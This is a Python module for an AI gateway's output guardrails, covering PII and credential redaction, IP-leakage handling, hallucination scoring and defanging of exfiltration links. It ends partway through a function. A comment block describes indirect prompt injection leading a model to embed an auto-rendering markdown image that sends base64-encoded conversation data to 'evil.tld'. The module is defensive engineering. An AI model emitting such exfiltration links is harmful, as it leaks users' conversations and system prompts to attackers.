"""
Output Guard -- generator-level output guardrails for the gateway.

Orchestrates all output inspection checks:
1. PII/secret detection (delegated to InputScanner)
2. Hallucination risk scoring (pattern + grounding + contradiction)
3. IP/infrastructure leakage
4. Credential exposure
5. Semantic leakage detection (optional, via SemanticLeakageDetector)

Returns the highest-severity OutputVerdict across all checks.
Action precedence: block(4) > redact(3) > rewrite(2) > flag(1) > allow(0).
"""
from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from scanner import InputScanner

try:
    from .patterns import (
        detect_credential_exposure,
        detect_hallucination_markers,
        detect_ip_leakage,
        detect_pii,
        detect_secrets,
        get_compliance_tags,
        is_safety_refusal_output,
        redact_all,
        _iter_transport_decodes,
    )
except ImportError:
    from patterns import (
        detect_credential_exposure,
        detect_hallucination_markers,
        detect_ip_leakage,
        detect_pii,
        detect_secrets,
        get_compliance_tags,
        is_safety_refusal_output,
        redact_all,
        _iter_transport_decodes,
    )

LOG = logging.getLogger("gateway.output_guard")

ACTION_PRIORITY = {"allow": 0, "flag": 1, "rewrite": 2, "redact": 3, "block": 4}

# Per-detector output actions an operator may configure. Anything outside this
# set falls back to the detector's default action.
_VALID_OUTPUT_ACTIONS = frozenset({"block", "redact", "rewrite", "flag", "allow"})

# C-1: output-threat categories that are SURGICALLY REDACTED-and-served (200),
# never whole-response blocked. The tier-2 guard model emits pci (card numbers)
# and phi (health info) as categories distinct from pii — all are redactable, so
# a benign answer incidentally containing a card/MRN must be masked-in-place, not
# 403'd. (jailbreak/injection/hallucination/ip_leakage stay blockable.)
_REDACTABLE_OUTPUT_CATEGORIES = frozenset({"pii", "pci", "phi", "secret", "credential"})

# ── G13: output-side data-exfiltration channel neutralization ───────────────────
# A model steered by indirect injection can embed its answer with an auto-rendering
# markdown IMAGE (or a link / bare URL) that points at an attacker-controlled host
# and smuggles data in the URL path/query/fragment:
#     ![loading](https://evil.tld/log?d=<base64 of the conversation / system prompt>)
# When the client renders the markdown, the browser silently GETs the URL — a
# ZERO-CLICK exfiltration of whatever was encoded, EVEN WHEN the payload is not
# PII-shaped (so the PII/secret/credential detectors never fire). This is Insecure
# Output Handling (OWASP LLM02 / LLM05). The output guard neutralizes the channel:
# it defangs the auto-render (image -> plain link) and masks the smuggled payload,
# delivering the rest of the answer intact (surgical redact, never whole-block).
_MD_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\(\s*<?(https?://[^)\s<>]+)>?\s*\)", re.IGNORECASE)
_MD_LINK_RE = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*<?(https?://[^)\s<>]+)>?\s*\)", re.IGNORECASE)
_BARE_URL_RE = re.compile(r"(?<![\]\(\[])https?://[^\s)<>\[\]]+", re.IGNORECASE)
# Cap the number of URLs inspected per output so a pathological response with
# thousands of links cannot make neutralization super-linear.
_MAX_EXFIL_URLS = 256


def _url_tail(url: str) -> str:
    """The exfil-bearing portion of a URL: path + query + fragment (scheme+host dropped)."""
    m = re.match(r"https?://[^/?#]*(.*)", url, re.IGNORECASE)
    return m.group(1) if m else ""


def _url_host_prefix(url: str) -> str:
    """``scheme://host`` prefix of ``url`` (everything before path/query/fragment)."""
    m = re.match(r"(https?://[^/?#]*)", url, re.IGNORECASE)
    return m.group(1) if m else url


def _url_smuggles_data(url: str) -> str:
    """Return a non-empty reason if ``url`` carries a smuggled data payload.

    Two independent signals over the URL tail (path/query/fragment):
      * ``"encoded_payload"`` — an encoded blob that base64/hex-DECODES to
        mostly-printable text (arbitrary-data exfil: conversation, system prompt,
        identifiers). A random hash / HMAC signature decodes to binary and does
        NOT trip this, separating exfil from legit long opaque tokens.
      * ``"sensitive_payload"`` — detected PII / secret / credential in the raw or
        decoded tail (plaintext or encoded PII exfil).
    """
    tail = _url_tail(url)
    if not tail:
        return ""
    # A base64 blob smuggled in a PATH segment (…/beacon/<blob>.png) is fused with
    # the surrounding '/' and '.' (both legal in base64/URLs) so it won't decode as
    # one clean token. Also scan a delimiter-split view so each path/query segment
    # is an isolated decode candidate. (The raw tail still covers query blobs that
    # use standard-base64 '/' which the split would otherwise break.)
    segmented = re.sub(r"[/?&=#;,.\s]+", " ", tail)
    decoded_parts: list[str] = []
    for src in (tail, segmented):
        for tok, dec in _iter_transport_decodes(src):
            if len(tok) >= 24 and len(dec) >= 8:
                decoded_parts.append(dec)
    probe = tail + "\n" + segmented + (("\n" + "\n".join(decoded_parts)) if decoded_parts else "")
    if detect_pii(probe) or detect_secrets(probe) or detect_credential_exposure(probe):
        return "sensitive_payload"
    if decoded_parts:
        return "encoded_payload"
    return ""


def _scan_exfil_channels(text: str):
    """Yield ``(kind, url, reason)`` for each data-exfiltration channel in ``text``.

    ``kind`` is ``"image"`` (zero-click auto-render), ``"link"`` (one-click) or
    ``"bare"``. Images trip on EITHER signal (zero-click, and answer images are
    static assets so an opaque data payload is the beacon signature — low FP).
    Links / bare URLs trip ONLY on the stronger ``"sensitive_payload"`` signal:
    they legitimately carry long opaque tokens (presigned / tracking URLs), so an
    encoded-blob-alone would false-positive.
    """
    if not text or ("http://" not in text and "https://" not in text):
        return
    seen: set[tuple[str, str]] = set()
    budget = _MAX_EXFIL_URLS
    for kind, regex in (("image", _MD_IMAGE_RE), ("link", _MD_LINK_RE), ("bare", _BARE_URL_RE)):
        for m in regex.finditer(text):
            if budget <= 0:
                return
            budget -= 1
            url = (m.group(2) if kind != "bare" else m.group(0)).strip().rstrip(").,'\"")
            reason = _url_smuggles_data(url)
            if not reason:
                continue
            if kind != "image" and reason != "sensitive_payload":
                continue
            key = (kind, url)
            if key in seen:
                continue
            seen.add(key)
            yield kind, url, reason


def neutralize_exfil_channels(text: str) -> str:
    """Defang output-side data-exfiltration channels: mask the smuggled payload and
    stop the zero-click auto-render (image -> plain link). Strict no-op on benign
    markdown / URLs (only constructs that trip :func:`_url_smuggles_data` change)."""
    if not text or ("http://" not in text and "https://" not in text):
        return text

    def _defang(url: str) -> str:
        raw = url.strip().rstrip(").,'\"")
        return f"{_url_host_prefix(raw)}/[exfil-redacted]"

    def _img_sub(m: "re.Match[str]") -> str:
        url = m.group(2).strip().rstrip(").,'\"")
        if _url_smuggles_data(url):  # image trips on either signal
            return f"[{m.group(1)}]({_defang(url)})"  # drop leading '!' -> no auto-render
        return m.group(0)

    def _link_sub(m: "re.Match[str]") -> str:
        url = m.group(2).strip().rstrip(").,'\"")
        if _url_smuggles_data(url) == "sensitive_payload":
            return f"[{m.group(1)}]({_defang(url)})"
        return m.group(0)

    def _bare_sub(m: "re.Match[str]") -> str:
        url = m.group(0).strip().rstrip(").,'\"")
        if _url_smuggles_data(url) == "sensitive_payload":
            return _defang(url)
        return m.group(0)

    out = _MD_IMAGE_RE.sub(_img_sub, text)
    out = _MD_LINK_RE.sub(_link_sub, out)
    out = _BARE_URL_RE.sub(_bare_sub, out)
    return out

_STOPWORDS = frozenset({
    "the", "a", "an", "is", "are", "was", "were", "be", "been", "being",
    "have", "has", "had", "do", "does", "did", "will", "would", "could",
    "should", "may", "might", "shall", "can", "to", "of", "in", "for",
    "on", "with", "at", "by", "from", "it", "this", "that", "and", "or",
    "but", "not", "no", "if", "so", "as",
})

# Strong self-contradiction only — bare "however/but" in refusals caused false
# positives. Pattern 3 previously matched bare negation/correction words
# ("not true|incorrect|wrong|mistaken|inaccurate") ANYWHERE, which fired on
# benign corrective prose that debunks an *external* misconception
# ("That is not true. The Earth is a sphere."). It now requires the negation to
# reference the SPEAKER'S OWN earlier assertion (self-reference anchor) so only
# genuine self-contradiction within the same output is scored.
_CONTRADICTION_PATTERNS = [
    re.compile(r"\bcontrary to (?:what I|my)\b", re.IGNORECASE),
    re.compile(
        r"\b(?:actually|in fact),?\s+(?:that|this)\s+(?:is|was)\s+(?:not|incorrect|wrong)\b",
        re.IGNORECASE,
    ),
    re.compile(
        r"\b(?:I (?:said|stated|claimed|mentioned|told you)|"
        r"(?:earlier|previously|above|before) I|my (?:previous|earlier|prior) (?:statement|answer|claim|response))\b"
        r"(?:[^.!?]{0,80})\b(?:not true|incorrect|wrong|mistaken|inaccurate|was wrong|is false)\b",
        re.IGNORECASE,
    ),
]

# Default threshold when no RAG context (pattern noise is higher without grounding).
_NO_CONTEXT_HALLUCINATION_THRESHOLD = 0.45
_RAG_GROUNDED_HALLUCINATION_THRESHOLD = 0.2


def _mask_value_for_detail(value: str, max_len: int = 24) -> str:
    """Mask a raw matched PII/secret value for the client-facing ``detail`` string.

    ``OutputVerdict.detail`` reaches the END CLIENT via zeroshield response
    metadata on redact/block paths, so it must never carry a raw matched value
    (otherwise a just-redacted SSN/email leaks back through metadata).

    ``matched_values`` deliberately keeps the RAW value for the operator
    console (control-plane telemetry); only this human-readable string is
    masked. Prefer :func:`redact_all` for consistency with the tier-2
    evidence path (M-01); if the bare value does not re-match its pattern out
    of context (context-dependent patterns), fall back to a deterministic
    partial mask so a raw value can never slip through.
    """
    raw = str(value)
    if not raw:
        return raw
    masked = redact_all(raw)
    if masked == raw:
        # Pattern did not re-match the bare value — deterministic partial mask.
        masked = raw[:2] + "*" * max(len(raw) - 2, 3)
    return f"{masked[:max_len]}{'…' if len(masked) > max_len else ''}"


# ── G10: typed-placeholder masking of semantically-identified spans ─────────────
# The tier-2 guard model can flag PII/secret content that has NO deterministic regex
# (free-text names, non-standard card/ID layouts, passphrases). ``redact_all`` is a
# no-op on those, so a "redact" verdict egressed the value raw (honestly relabeled to
# "flag" by main.py, but still leaked). We mask the guard model's identified spans
# with a typed placeholder so the redact actually removes the bytes.
_TYPED_PLACEHOLDER = {
    "pii": "[REDACTED_PII]",
    "pci": "[REDACTED_CARD]",
    "phi": "[REDACTED_PHI]",
    "secret": "[REDACTED_SECRET]",
    "credential": "[REDACTED_SECRET]",
}
# Bounds keep span-masking SURGICAL: skip a span too short to be a real value (noise)
# or so long it is a whole sentence (masking it would destroy legit content — the
# guard model is expected to return value-level evidence).
_SPAN_MASK_MIN_LEN = 3
_SPAN_MASK_MAX_LEN = 120


def _typed_placeholder(threat_type: str) -> str:
    return _TYPED_PLACEHOLDER.get(str(threat_type or "").lower(), "[REDACTED]")


# A detector CATEGORY LABEL ("ssn", "email", "aws_access_key") — a lowercase
# snake_case identifier — is NOT a raw sensitive value: it is safe to show in
# evidence and must NOT be masked/used as a redaction span. The tier-2 guard model,
# by contrast, returns RAW evidence fragments (free-text names, card numbers) that
# MUST be masked. Length alone can't tell them apart; the key SHAPE can.
_PATTERN_KEY_RE = re.compile(r"[a-z][a-z0-9_]{1,39}")


def _looks_like_pattern_key(s: str) -> bool:
    return bool(_PATTERN_KEY_RE.fullmatch(s or ""))


def _mask_evidence_span(span: str, threat_type: str) -> str:
    """Client-safe form of a guard-model evidence fragment (G16).

    The tier-2 verdict's ``matched_patterns`` reaches the client via the enforcement
    envelope (main.py) — it must never carry a RAW sensitive value. ``redact_all``
    handles standard PII/secret; a category label stays readable; any remaining
    free-text value (a name / passphrase redact_all has no regex for) is partial-
    masked so it cannot leak the just-redacted value back through metadata."""
    s = str(span)
    r = redact_all(s)
    if r != s:  # standard PII/secret regex masked it
        return r
    if len(s.strip()) < _SPAN_MASK_MIN_LEN or _looks_like_pattern_key(s.strip()):
        return s  # category label / trivial fragment -> keep readable
    return _mask_value_for_detail(s)


def _redaction_spans_from(spans, threat_type: str) -> list[str]:
    """Filter guard-model evidence spans to value-like fragments worth masking, and
    only for redactable categories (so a jailbreak/injection evidence fragment is
    never used to blank out response text). Category labels (pattern keys) are
    excluded — they are not raw values, so they must never blank response text."""
    if str(threat_type or "").lower() not in _REDACTABLE_OUTPUT_CATEGORIES:
        return []
    out: list[str] = []
    for s in spans or []:
        s = str(s).strip()
        if not (_SPAN_MASK_MIN_LEN <= len(s) <= _SPAN_MASK_MAX_LEN):
            continue
        if "REDACTED" in s.upper() or _looks_like_pattern_key(s):
            continue
        out.append(s)
    return out


def _mask_spans_typed(text: str, spans, threat_type: str) -> str:
    """Replace each literal ``span`` occurrence in ``text`` with a typed placeholder.

    Literal (no regex) + bounded surgical removal of a semantically-identified value
    the deterministic redactor could not match. Skips a span that alone would mask
    more than ~40% of the response (guards against an over-broad sentence-level
    evidence span). Fails toward redaction: a slightly incidental over-mask is
    preferable to egressing the raw sensitive value."""
    if not text or not spans:
        return text
    placeholder = _typed_placeholder(threat_type)
    out = text
    seen: set[str] = set()
    for s in spans:
        s = str(s).strip()
        # The [_SPAN_MASK_MIN_LEN, _SPAN_MASK_MAX_LEN] bound is the only over-mask
        # guard: too-short spans are noise; a span > _SPAN_MASK_MAX_LEN is an over-
        # broad (sentence-level) evidence fragment and is refused. Any value-length
        # span within bounds is masked even if it is a large fraction of a short
        # answer — fail-toward-redaction (a placeholder never "nukes" legit content).
        if s in seen or not (_SPAN_MASK_MIN_LEN <= len(s) <= _SPAN_MASK_MAX_LEN):
            continue
        seen.add(s)
        if s in out:
            out = out.replace(s, placeholder)
    return out


@dataclass
class OutputVerdict:
    """Result of output inspection."""

    action: str = "allow"
    threat_type: str = ""
    confidence: float = 0.0
    detail: str = ""
    matched_patterns: list[str] = field(default_factory=list)
    matched_values: dict[str, str] = field(default_factory=dict)
    compliance_tags: list[str] = field(default_factory=list)
    # G10: RAW sensitive spans the tier-2 guard model identified SEMANTICALLY (free-
    # text names, non-standard card/ID layouts, passphrases) that ``redact_all`` has
    # no deterministic regex for. The sanitizer masks these with a typed placeholder
    # so a semantic redact verdict actually removes the bytes instead of being a
    # no-op that egresses raw. Kept OFF the client-facing telemetry surface (never
    # serialized by output_guard_telemetry_meta) so the raw span stays internal.
    redaction_spans: list[str] = field(default_factory=list)
    # M11: True when the tier-2 OUTPUT guard model could not scan (outage /
    # breaker-open / parse failure) and the response was passed UNSCANNED
    # (fail-open). Surfaced to telemetry + the client zeroshield metadata so a
    # guard outage is VISIBLE, not silent.
    scan_degraded: bool = False


@dataclass
class HallucinationScore:
    """Numeric hallucination risk assessment."""

    risk_score: float = 0.0
    pattern_score: float = 0.0
    grounding_score: float = 0.0
    contradiction_score: float = 0.0
    matched_markers: list[str] = field(default_factory=list)
    detail: str = ""


class OutputGuard:
    """
    Orchestrates all output inspection checks and returns the
    highest-severity verdict.

    Configuration keys (from gateway config dict):
    - output_guard_enabled: master toggle
    - output_block_on_credential: block on credential exposure (default True)
    - output_block_on_ip_leakage: block on IP leakage (default False, flag only)
    - hallucination_flag_enabled: flag hallucination markers (default True)
    """

    def __init__(self, scanner: "InputScanner", config: dict | None = None) -> None:
        self._scanner = scanner
        self._config = config or {}
        self._leakage_detector = None
        self._grounding_guard = None  # type: ignore[assignment]

    def set_leakage_detector(self, detector) -> None:
        """Attach an optional SemanticLeakageDetector."""
        self._leakage_detector = detector

    def set_grounding_guard(self, guard) -> None:
        """Attach an optional :class:`rag_pipeline.grounding_guard.GroundingGuard`.

        When attached, the ``hallucination_grounding_mode`` org-config field
        (per migration 0022) selects the algorithm used to compute the
        ``grounding_score`` component of the hallucination risk:

        * ``"lexical"`` (default) — existing Jaccard token-overlap, no
          embeddings used. Preserves legacy behavior.
        * ``"semantic"`` — max Bedrock Titan v2 cosine similarity (fail-open
          to lexical if the embedder is unavailable / circuit OPEN).
        * ``"hybrid"`` — mean of lexical and semantic (fail-open to lexical
          on embedder failure).
        """
        self._grounding_guard = guard

    async def inspect(
        self,
        text: str,
        context_chunks: list[str] | None = None,
        *,
        org_config: dict | None = None,
        org_slug: str = "",
    ) -> OutputVerdict:
        """
        Run all output checks. Returns the combined highest-severity verdict.

        Checks are run in order:
        1. PII/secret (via scanner) -> redact
        2. Credential exposure -> block or redact
        3. IP leakage -> block or flag
        4. Hallucination scoring -> flag
        5. Semantic leakage -> flag (if detector attached)

        The worst (highest-priority) action wins.

        Args:
            org_config: Per-tenant config (used to look up
                ``hallucination_grounding_mode`` and
                ``hallucination_grounding_threshold`` from migration 0022).
                Falls back to the gateway-level ``self._config`` if omitted.
            org_slug: Tenant identifier passed to the semantic grounding
                backend for embedder cache isolation and telemetry.
        """
        if not text:
            return OutputVerdict()

        verdicts: list[OutputVerdict] = []

        # Per-detector control reads from the per-tenant org_config first, then
        # falls back to the gateway-level config. Each detector has an independent
        # enable toggle and a configurable action (block/redact/rewrite/flag/allow).
        cfg = org_config or self._config

        def _enabled(key: str, default: bool = True) -> bool:
            return bool(cfg.get(key, default))

        def _action(key: str, default: str) -> str:
            value = str(cfg.get(key, default) or default).lower()
            return value if value in _VALID_OUTPUT_ACTIONS else default

        if _enabled("output_pii_enabled", True):
            pii_action = _action("output_pii_action", "redact")
            if pii_action != "allow":
                pii_verdict = await self._check_pii_secrets(text, pii_action)
                if pii_verdict.action != "allow":
                    verdicts.append(pii_verdict)

        if _enabled("output_credential_enabled", True):
            # 1.7 policy "redact the response": output secrets/credentials are
            # surgically REDACTED + delivered (200), not whole-response blocked.
            # (output_credential_action may still override per-org.)
            cred_action = _action("output_credential_action", "redact")
            if cred_action != "allow":
                cred_verdict = self._check_credential_exposure(text, cred_action)
                if cred_verdict.action != "allow":
                    verdicts.append(cred_verdict)

        if _enabled("output_ip_leakage_enabled", True):
            ip_action = _action(
                "output_ip_leakage_action",
                "block" if self._config.get("output_block_on_ip_leakage", False) else "redact",
            )
            # R2/E15: ip_leakage is a heuristic, false-positive-prone signal (a single
            # private/example IP in an educational answer is benign), so it must never
            # DESTROY the whole response: a whole-response "rewrite" is softened, and a
            # hard "block" is only honoured when the org EXPLICITLY opted in via
            # output_block_on_ip_leakage. BUT a REAL internal address that survives FP
            # suppression (the example-address carve-out + the tier-2 guard_rated_clean
            # drop below) must be NEUTRALISED, not egressed raw — so the floor is now
            # "redact" (surgical mask of the infra token), matching PII's always-redact
            # behaviour, instead of the old "flag" that let it leak in monitor-mode orgs.
            if ip_action in ("rewrite", "flag"):
                ip_action = "redact"
            elif ip_action == "block" and not self._config.get("output_block_on_ip_leakage", False):
                ip_action = "redact"
            if ip_action != "allow":
                ip_verdict = self._check_ip_leakage(text, ip_action)
                if ip_verdict.action != "allow":
                    verdicts.append(ip_verdict)

        if cfg.get("hallucination_flag_enabled", self._config.get("hallucination_flag_enabled", True)):
            hall_action = _action("output_hallucination_action", "flag")
            if hall_action != "allow":
                hall_verdict = await self._check_hallucination_markers(
                    text,
                    context_chunks,
                    action=hall_action,
                    org_config=org_config,
                    org_slug=org_slug,
                )
                if hall_verdict.action != "allow":
                    verdicts.append(hall_verdict)

        if self._leakage_detector is not None:
            leakage_verdict = self._check_semantic_leakage(text)
            if leakage_verdict.action != "allow":
                verdicts.append(leakage_verdict)

        # G13: neutralize output-side data-exfiltration channels (markdown image /
        # link / bare URL smuggling data to an external host). Redactable + delivered
        # 200 (defang the beacon, keep the answer); never whole-response blocked.
        if _enabled("output_exfil_enabled", True):
            exfil_action = _action("output_exfil_action", "redact")
            if exfil_action != "allow":
                exfil_verdict = self._check_exfil_channel(text, exfil_action)
                if exfil_verdict.action != "allow":
                    verdicts.append(exfil_verdict)

        # ── Tier-2: ZeroShield guard model (ML) on the OUTPUT ───────────────
        # Mirrors INPUT scanning: the static detectors above are tier-1; the
        # ZeroShield guard model then scans the model output (same guard model +
        # breaker/cache as input). Gated by output_tier2_enabled (default on)
        # AND the org tri-state tier2_enabled. FAIL-OPEN: a guard-model outage
        # must never block an already-generated response — scan_output_with_tier2
        # degrades to the static verdict and any error here is swallowed.
        output_scan_degraded = False
        # R2: track whether the tier-2 guard model actually ran and rated the
        # OUTPUT clean (allow). When it did, its verdict is authoritative over the
        # false-positive-prone deterministic ip_leakage heuristic — a benign
        # example IP that the smart guard model cleared must not be destroyed by
        # the static detector. (Only ip_leakage is gated this way; PII/secret/
        # credential static detectors stay fail-safe and are NOT suppressed.)
        guard_rated_clean = False
        if _enabled("output_tier2_enabled", True) and self._scanner is not None:
            try:
                t2 = await self._scanner.scan_output_with_tier2(
                    text,
                    org_tier2_override=cfg.get("tier2_enabled"),
                    org_slug=org_slug,
                )
                # M11: a degraded tier-2 OUTPUT scan (breaker open / parse fail)
                # comes back as a 'scanner_degraded' verdict — the output was NOT
                # confidently scanned. Mark degraded so it's visible downstream.
                if t2 is not None and str(getattr(t2, "threat_type", "")) == "scanner_degraded":
                    output_scan_degraded = True
                # R2: a completed, non-degraded scan that returned a non-blocking
                # verdict = the guard model rated this output clean.
                if (
                    t2 is not None
                    and not output_scan_degraded
                    and t2.action not in ("block", "redact", "flag")
                ):
                    guard_rated_clean = True
                if t2 is not None and t2.action in ("block", "redact", "flag"):
                    t2_patterns = list(getattr(t2, "matched_patterns", []) or [])
                    # Defense-in-depth (M-01): the guard-model ScanVerdict can carry
                    # raw evidence/findings (matched fragments of the model output) in
                    # its matched_patterns and detail strings. Those flow straight into
                    # the client-facing OutputVerdict, so scrub any PII/secret/credential
                    # value out of them here as a belt-and-suspenders to the scanner.py
                    # source fix. redact_all is a no-op on plain pattern-key strings.
                    t2_compliance_tags = get_compliance_tags(t2_patterns)
                    # G10: keep the RAW guard-model evidence spans so the sanitizer can
                    # mask semantically-detected PII/secret that redact_all has no regex
                    # for (free-text names, non-standard layouts, passphrases). Only for
                    # redactable categories, and only value-like spans (see
                    # _redaction_spans_from). These stay INTERNAL (never serialized to
                    # the client/telemetry); the display copy below is still masked.
                    t2_redaction_spans = (
                        _redaction_spans_from(t2_patterns, t2.threat_type or "")
                        if t2.action in ("block", "redact")
                        else []
                    )
                    # G16: mask RAW evidence VALUES (free-text names/passphrases that
                    # redact_all is a no-op on) in the client-facing display copy while
                    # keeping category labels ("ssn"/"email") readable — matched_patterns
                    # flows to the client enforcement envelope, so a raw value here would
                    # leak the just-redacted content back through metadata.
                    t2_patterns = [_mask_evidence_span(str(p), t2.threat_type or "") for p in t2_patterns]
                    t2_detail = redact_all(
                        t2.detail or "ZeroShield guard model (tier-2) flagged output"
                    )
                    verdicts.append(OutputVerdict(
                        action=t2.action,
                        threat_type=t2.threat_type or "guard_model",
                        confidence=float(getattr(t2, "confidence", 0.0) or 0.0),
                        detail=t2_detail,
                        matched_patterns=t2_patterns,
                        compliance_tags=t2_compliance_tags,
                        redaction_spans=t2_redaction_spans,
                    ))
            except Exception:  # noqa: BLE001 - output tier-2 must never break delivery
                # M11: fail-open (never block an already-generated response on a
                # guard outage) but make it VISIBLE — WARN (was silent debug) +
                # mark the verdict degraded so telemetry + client metadata record
                # that the output was passed UNSCANNED.
                output_scan_degraded = True
                LOG.warning(
                    "Output tier-2 guard-model scan FAILED — output passed UNSCANNED (fail-open / degraded)",
                    exc_info=True,
                )

        # R2: the guard model cleared this output, so drop the false-positive-prone
        # deterministic ip_leakage verdict (e.g. a textbook 192.168.0.1). The
        # guard model is the authoritative arbiter for the infra-leakage heuristic;
        # other categories (PII/secret/credential/hallucination) are unaffected.
        #
        # N-IP FIX: but do NOT suppress when the org EXPLICITLY opted into hard
        # deterministic IP blocking via output_block_on_ip_leakage. That flag is a
        # deliberate "I care about internal IPs even if they look benign" signal —
        # letting a tier-2 "clean" rating silently drop the verdict would override
        # the org's explicit policy. Default orgs (no opt-in) still get the FP
        # reduction; opt-in orgs get deterministic blocking tier-2 cannot undo.
        _ip_hard_block = bool(self._config.get("output_block_on_ip_leakage", False))
        if guard_rated_clean and verdicts and not _ip_hard_block:
            verdicts = [v for v in verdicts if str(getattr(v, "threat_type", "")) != "ip_leakage"]

        if not verdicts:
            return OutputVerdict(scan_degraded=output_scan_degraded)

        selected = self._select_highest_severity(verdicts)
        selected.scan_degraded = selected.scan_degraded or output_scan_degraded
        # 1.7 policy: PII / secrets / credentials are SURGICALLY REDACTED and the
        # response delivered (200) — never whole-response blocked. If any detector
        # (static or tier-2 guard model) escalated a redactable category to "block",
        # downgrade to "redact" so the offending tokens are masked in place. Non-
        # redactable threats (jailbreak/injection/hallucination/etc.) still block.
        # C-1: the tier-2 guard model emits pci (card numbers) and phi (health
        # info) as DISTINCT categories from pii — they are equally redactable, so
        # they must be in the downgrade set too, or a benign answer that happens
        # to contain a card/MRN gets whole-response HARD-BLOCKED (403) instead of
        # surgically masked-and-served (200), contradicting the §1.7 contract.
        if selected.action == "block" and str(selected.threat_type or "") in _REDACTABLE_OUTPUT_CATEGORIES:
            selected.action = "redact"
        return selected

    async def _check_pii_secrets(self, text: str, action: str = "redact") -> OutputVerdict:
        """Delegate PII/secret detection to the existing scanner."""
        verdict = await self._scanner.scan_output(text)
        if verdict.threat_type in ("pii", "secret") and verdict.matched_patterns:
            pattern_keys = verdict.matched_patterns
            matched_values = dict(getattr(verdict, "matched_values", None) or {})
            value_detail = ""
            if matched_values:
                # detail is client-facing: embed MASKED values only.
                # matched_values keeps the raw values for operator telemetry.
                value_detail = " — " + ", ".join(
                    f"{k}={_mask_value_for_detail(v)}"
                    for k, v in matched_values.items()
                )
            return OutputVerdict(
                action=action,
                threat_type=verdict.threat_type,
                confidence=verdict.confidence,
                detail=f"PII/secret detected in output: {', '.join(pattern_keys)}{value_detail}",
                matched_patterns=pattern_keys,
                matched_values=matched_values,
                compliance_tags=get_compliance_tags(pattern_keys),
            )
        return OutputVerdict()

    def _check_credential_exposure(self, text: str, action: str = "block") -> OutputVerdict:
        """Check for exposed credentials (bearer tokens, connection strings, etc.)."""
        found = detect_credential_exposure(text)
        if not found:
            return OutputVerdict()

        pattern_keys = list(found.keys())
        return OutputVerdict(
            action=action,
            threat_type="credential",
            confidence=0.95,
            detail=f"Credential exposure detected: {', '.join(pattern_keys)}",
            matched_patterns=pattern_keys,
            compliance_tags=get_compliance_tags(pattern_keys),
        )

    def _check_ip_leakage(self, text: str, action: str = "flag") -> OutputVerdict:
        """Check for internal IP addresses, hostnames, and file paths."""
        found = detect_ip_leakage(text)
        if not found:
            return OutputVerdict()

        pattern_keys = list(found.keys())
        return OutputVerdict(
            action=action,
            threat_type="ip_leakage",
            confidence=0.8,
            detail=f"Infrastructure leakage detected: {', '.join(pattern_keys)}",
            matched_patterns=pattern_keys,
            compliance_tags=get_compliance_tags(pattern_keys),
        )

    async def _check_hallucination_markers(
        self,
        text: str,
        context_chunks: list[str] | None = None,
        *,
        action: str = "flag",
        org_config: dict | None = None,
        org_slug: str = "",
    ) -> OutputVerdict:
        """Enhanced hallucination check with numeric scoring."""
        score = await self.score_hallucination(
            text,
            context_chunks,
            org_config=org_config,
            org_slug=org_slug,
        )

        cfg = org_config or self._config
        has_context = bool(context_chunks)
        if has_context:
            threshold = float(
                cfg.get("hallucination_grounding_threshold", _RAG_GROUNDED_HALLUCINATION_THRESHOLD)
            )
        else:
            threshold = float(
                cfg.get(
                    "hallucination_no_context_threshold",
                    cfg.get("hallucination_grounding_threshold", _NO_CONTEXT_HALLUCINATION_THRESHOLD),
                )
            )

        if score.risk_score < threshold:
            return OutputVerdict()

        return OutputVerdict(
            action=action,
            threat_type="hallucination",
            confidence=score.risk_score,
            detail=score.detail,
            matched_patterns=score.matched_markers,
            compliance_tags=[],
        )

    def _check_semantic_leakage(self, text: str) -> OutputVerdict:
        """Check output for semantic similarity to confidential content."""
        verdict = self._leakage_detector.check_leakage(text)
        if verdict.action != "allow":
            return OutputVerdict(
                action="flag",
                threat_type="semantic_leakage",
                confidence=verdict.leakage_score,
                detail=verdict.detail,
                matched_patterns=verdict.matched_fingerprints,
                compliance_tags=["DLP"],
            )
        return OutputVerdict()

    def _check_exfil_channel(self, text: str, action: str = "redact") -> OutputVerdict:
        """G13: detect data-exfiltration channels in the model output.

        The client-facing ``detail`` names only the channel kind and destination
        host (safe) — never the smuggled payload, which is masked by
        :func:`neutralize_exfil_channels` on the sanitized egress.
        """
        findings = list(_scan_exfil_channels(text))
        if not findings:
            return OutputVerdict()
        kinds = sorted({k for k, _u, _r in findings})
        hosts: list[str] = []
        for _k, url, _r in findings:
            hm = re.match(r"https?://([^/?#]*)", url, re.IGNORECASE)
            if hm and hm.group(1):
                hosts.append(hm.group(1))
        zero_click = any(k == "image" for k, _u, _r in findings)
        host_list = ", ".join(sorted(set(hosts))[:3]) or "external host"
        return OutputVerdict(
            action=action,
            threat_type="exfil_channel",
            confidence=0.9 if zero_click else 0.8,
            detail=(
                f"Data-exfiltration channel in output "
                f"({'/'.join(kinds)} -> {host_list}): smuggled payload neutralized"
                + (" (zero-click auto-render defanged)" if zero_click else "")
            ),
            matched_patterns=[f"exfil_{k}" for k in kinds],
            compliance_tags=["DLP"],
        )

    async def score_hallucination(
        self,
        output_text: str,
        context_chunks: list[str] | None = None,
        *,
        org_config: dict | None = None,
        org_slug: str = "",
    ) -> HallucinationScore:
        """
        Compute a numeric hallucination risk score.

        Components:
        1. Pattern score: count of hallucination marker matches, normalized
        2. Grounding score: if context_chunks provided, measure overlap.
           Algorithm is selected by the per-tenant
           ``hallucination_grounding_mode`` field (migration 0022):
           ``"lexical"`` (default), ``"semantic"``, or ``"hybrid"``. The
           semantic backend (Bedrock Titan v2) is used only when a
           :class:`GroundingGuard` has been attached via
           :meth:`set_grounding_guard`; otherwise we fall back to lexical.
        3. Contradiction score: detect self-contradictions within the output
        """
        if not output_text:
            return HallucinationScore()

        if is_safety_refusal_output(output_text):
            return HallucinationScore(
                risk_score=0.0,
                pattern_score=0.0,
                grounding_score=1.0,
                contradiction_score=0.0,
                matched_markers=[],
                detail="hallucination_risk=0.000 (safety_refusal_excluded)",
            )

        found = detect_hallucination_markers(output_text)
        # Epistemic-hedging markers ("I'm not sure", "I think", "I cannot verify")
        # signal CALIBRATED uncertainty, not fabrication. Counting them with the
        # same positive sign as fabrication-shape markers inverts the score —
        # penalizing cautious-correct answers while flat confident lies (no
        # markers) score 0. Exclude hedges from the risk weight; still report
        # them in matched_markers for telemetry transparency.
        _HEDGE_MARKERS = {"uncertainty_hedge", "confidence_disclaimer"}
